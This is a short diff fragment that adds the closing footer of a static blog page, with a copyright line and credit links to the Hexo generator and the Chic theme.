+        <span>© zhhhy | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Sirice19/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+    </div>
+</body>
+</html>
